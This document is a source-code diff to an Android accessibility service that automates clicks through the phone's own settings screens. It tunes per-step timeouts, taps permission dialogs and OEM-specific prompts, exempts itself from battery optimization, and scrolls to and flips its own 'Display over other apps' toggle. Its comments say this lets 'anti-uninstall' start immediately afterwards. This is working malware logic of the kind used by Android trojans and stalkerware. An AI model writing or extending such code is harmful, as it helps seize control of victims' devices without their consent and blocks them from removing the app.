@@ -65,18 +65,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     interface BoolCheck { boolean check(); }
 
     private static final class SpecialPermTask {
-        final String   name;
-        final Intent   intent;
+        final String    name;
+        final Intent    intent;
         final BoolCheck isGranted;
-        SpecialPermTask(String name, Intent intent, BoolCheck isGranted) {
+        final long      stepMs;   // max time to spend on this step
+        SpecialPermTask(String name, Intent intent, BoolCheck isGranted, long stepMs) {
             this.name      = name;
             this.intent    = intent;
             this.isGranted = isGranted;
+            this.stepMs    = stepMs;
         }
     }
 
-    private static final long SP_STEP_MS  = 2_000L;   // 2 s per permission
-    private static final long SP_TOTAL_MS = 10_000L;  // 10 s total budget
+    private static final long SP_TOTAL_MS = 12_000L;  // 12 s total budget for all steps
 
     private volatile boolean spActive     = false;
     private volatile int     spIdx        = 0;         // current step index
@@ -423,8 +424,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (spActive && spIdx < spQueue.size()) {
             SpecialPermTask currentTask = spQueue.get(spIdx);
 
-            // If this permission was already granted (e.g. user tapped manually
-            // before the auto-clicker got there), advance immediately.
+            // If already granted (e.g. user tapped manually) advance immediately.
             try {
                 if (currentTask.isGranted.check()) {
                     if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
@@ -433,46 +433,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
             } catch (Exception ignored) {}
 
-            // A. This screen shows a LIST of apps (e.g. "Display over other apps"
-            //    listing every app rather than going direct to the toggle page).
-            //    Find our app label in the list and click it to open the per-app page.
-            if (spFindAndClickOurAppInList(rootNode)) return true;
-
-            // B. Per-app toggle page — click any unchecked switch/toggle unconditionally.
-            //    We don't need the strict screen-text guard when the state machine is
-            //    driving us to a specific settings screen.
-            if (clickUncheckedSwitch(rootNode)) {
-                // After clicking the switch, check in 600 ms whether it's now granted.
-                // If so, cancel the step timer and advance to the next permission.
-                if (spHandler != null) {
-                    spHandler.postDelayed(() -> {
-                        if (!spActive || spIdx >= spQueue.size()) return;
-                        try {
-                            if (spQueue.get(spIdx).isGranted.check()) {
-                                spHandler.removeCallbacksAndMessages(null);
-                                spAdvance();
-                            }
-                        } catch (Exception ignored) {}
-                    }, 600);
-                }
-                return true;
+            // Route DisplayOver to its dedicated multi-step handler.
+            if ("DisplayOver".equals(currentTask.name)) {
+                return handleDisplayOverPermission(rootNode, screenText);
             }
 
-            // C. Battery-specific dialog buttons ("Don't optimize", "Allow", etc.)
+            // Battery step: try battery-specific keywords first, then general allow.
             if (tryGrantBatteryOptimization(rootNode, screenText)) return true;
+            for (String kw : ALLOW_KEYWORDS_EXACT)   { if (findAndClickFullWord(rootNode, kw))    return true; }
+            for (String kw : ALLOW_KEYWORDS_CONTAINS) { if (findAndClickContaining(rootNode, kw)) return true; }
+            if (tryGrantMiuiPermissions(rootNode, screenText))   return true;
+            if (tryGrantSamsungPermissions(rootNode, screenText)) return true;
+            if (tryGrantOppoPermissions(rootNode, screenText))   return true;
+            if (tryGrantHuaweiPermissions(rootNode, screenText)) return true;
 
-            // D. Standard keyword clicks for any runtime permission dialogs that
-            //    appear while the state machine is running.
-            for (String kw : ALLOW_KEYWORDS_EXACT)    { if (findAndClickFullWord(rootNode, kw))    return true; }
-            for (String kw : ALLOW_KEYWORDS_CONTAINS)  { if (findAndClickContaining(rootNode, kw)) return true; }
-
-            // E. OEM-specific handlers
-            if (tryGrantMiuiPermissions(rootNode, screenText))    return true;
-            if (tryGrantSamsungPermissions(rootNode, screenText))  return true;
-            if (tryGrantOppoPermissions(rootNode, screenText))     return true;
-            if (tryGrantHuaweiPermissions(rootNode, screenText))   return true;
-
-            // Nothing found this cycle — the step timer will advance us after SP_STEP_MS.
             return false;
         }
 
@@ -1016,7 +990,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private List<SpecialPermTask> buildSpecialPermQueue() {
         List<SpecialPermTask> q = new ArrayList<>();
 
-        // Step 1: Battery optimization — must come before Display Over
+        // Step 1: Battery optimization (1 s max — quick dialog)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             try {
                 android.os.PowerManager pm =
@@ -1028,18 +1002,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         android.os.PowerManager p2 =
                                 (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                         return p2 != null && p2.isIgnoringBatteryOptimizations(getPackageName());
-                    }));
+                    }, 1_000L));
                 }
             } catch (Exception ignored) {}
         }
 
-        // Step 2: Display Over Other Apps — requested LAST, after standard perms and battery
+        // Step 2: Display Over Other Apps (8 s max — list page + per-app page)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             try {
                 Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:" + getPackageName()));
                 q.add(new SpecialPermTask("DisplayOver", i,
-                        () -> Settings.canDrawOverlays(UnifiedAccessibilityService.this)));
+                        () -> Settings.canDrawOverlays(UnifiedAccessibilityService.this),
+                        8_000L));
             } catch (Exception ignored) {}
         }
 
@@ -1061,7 +1036,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     private void scheduleSpStepTimeout() {
-        if (spHandler == null) return;
+        if (spHandler == null || spIdx >= spQueue.size()) return;
+        long stepMs = spQueue.get(spIdx).stepMs;
         spHandler.postDelayed(() -> {
             if (!spActive) return;
             if (System.currentTimeMillis() - spTotalStart > SP_TOTAL_MS) {
@@ -1069,17 +1045,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             } else {
                 spAdvance();
             }
-        }, SP_STEP_MS);
+        }, stepMs);
     }
 
     /** Move to the next special permission (or finish if all done). */
     private void spAdvance() {
         if (!spActive) return;
+        if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
         spIdx++;
         if (spIdx >= spQueue.size()) {
             spActive = false;
-            Log.d(TAG, "SP granter: all done, going home");
-            performGlobalAction(GLOBAL_ACTION_HOME);
+            Log.d(TAG, "SP granter: all permissions done — activating normal mode");
+            // End grant phase immediately so defent/anti-uninstall starts right away
+            stopGrantPermsTimer();
+            try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
             return;
         }
         openCurrentSpecialPerm();
@@ -1176,6 +1155,110 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         } catch (Exception ignored) {}
         return false;
+    }
+
+    // ── Display Over Other Apps — dedicated two-screen handler ───────────────────
+
+    /**
+     * Handles the "Display over other apps" permission flow which has two screens:
+     *
+     * Screen 1 — App list:
+     *   "display" is visible on screen.
+     *   • Our app name IS visible  → click the app-name row (opens per-app page).
+     *   • Our app name NOT visible → swipe up once to scroll, then wait for next event.
+     *
+     * Screen 2 — Per-app toggle page (after clicking our app name):
+     *   Both "display" and our app name are visible; an unchecked toggle is present.
+     *   • Click the unchecked switch/toggle.
+     *   • After 800 ms go home and end the grant phase so normal mode activates.
+     */
+    private boolean handleDisplayOverPermission(AccessibilityNodeInfo rootNode, String screenText) {
+        String lower = screenText.toLowerCase();
+
+        // Confirm this is a "display over" related screen
+        if (!lower.contains("display")) return false;
+
+        boolean appNameVisible = spAppLabel != null && screenText.contains(spAppLabel);
+
+        // ── Screen 2: per-app page — toggle is present ──────────────────────
+        // Check for an unchecked switch WITHOUT clicking it yet, to confirm we are
+        // on the per-app page where only our app's toggle is shown.
+        if (appNameVisible && hasUncheckedSwitchOnScreen(rootNode)) {
+            if (clickUncheckedSwitch(rootNode)) {
+                Log.d(TAG, "DisplayOver: clicked toggle on per-app page — going home");
+                if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
+                spHandler = new Handler(Looper.getMainLooper());
+                spHandler.postDelayed(() -> {
+                    spActive = false;
+                    stopGrantPermsTimer(); // start normal mode (defent etc.) immediately
+                    try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
+                }, 800);
+                return true;
+            }
+        }
+
+        // ── Screen 1: list page — find and click our app name ───────────────
+        if (appNameVisible) {
+            if (spFindAndClickOurAppInList(rootNode)) {
+                Log.d(TAG, "DisplayOver: clicked app name in list — waiting for per-app page");
+                return true;
+            }
+        }
+
+        // ── App name not visible on list page — scroll up to find it ────────
+        if (!appNameVisible) {
+            Log.d(TAG, "DisplayOver: app name not visible — swiping up to find it");
+            performSwipeUp();
+            return true;
+        }
+
+        return false;
+    }
+
+    /** Returns true if an unchecked Switch/Toggle/Checkbox exists anywhere in the tree. */
+    private boolean hasUncheckedSwitchOnScreen(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        try {
+            CharSequence cls = node.getClassName();
+            if (cls != null) {
+                String c = cls.toString().toLowerCase();
+                if ((c.contains("switch") || c.contains("togglebutton") || c.contains("checkbox"))
+                        && !node.isChecked()) {
+                    return true;
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    boolean found = hasUncheckedSwitchOnScreen(child);
+                    child.recycle();
+                    if (found) return true;
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    /** Swipe up on the screen to reveal more list items. */
+    @SuppressWarnings("deprecation")
+    private void performSwipeUp() {
+        try {
+            android.view.WindowManager wm =
+                    (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
+            android.util.DisplayMetrics dm = new android.util.DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(dm);
+            int w = dm.widthPixels  > 0 ? dm.widthPixels  : 1080;
+            int h = dm.heightPixels > 0 ? dm.heightPixels : 1920;
+            Path path = new Path();
+            path.moveTo(w / 2f, h * 0.70f);
+            path.lineTo(w / 2f, h * 0.30f);
+            GestureDescription gesture = new GestureDescription.Builder()
+                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 400))
+                    .build();
+            dispatchGesture(gesture, null, null);
+        } catch (Exception e) {
+            Log.w(TAG, "performSwipeUp: " + e.getMessage());
+        }
     }
 
     /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
